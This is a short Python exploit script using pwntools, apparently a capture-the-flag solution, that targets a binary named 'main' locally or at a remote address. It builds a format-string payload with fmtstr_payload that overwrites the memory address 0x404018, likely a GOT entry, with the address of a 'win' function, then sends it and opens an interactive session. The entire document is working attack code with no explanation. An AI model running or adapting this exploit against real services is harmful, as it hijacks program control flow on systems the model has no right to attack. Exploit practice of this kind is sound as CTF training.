from pwn import *

context.binary = exe = ELF("./main")
def start():
    if args.LOCAL:
        return process("./main")
    else:
        return remote(sys.argv[1],sys.argv[2])

io = start()
win = exe.symbols['win']
writes = {0x404018:win}
payload = fmtstr_payload(6,writes,0)
io.sendline(payload)
io.interactive()
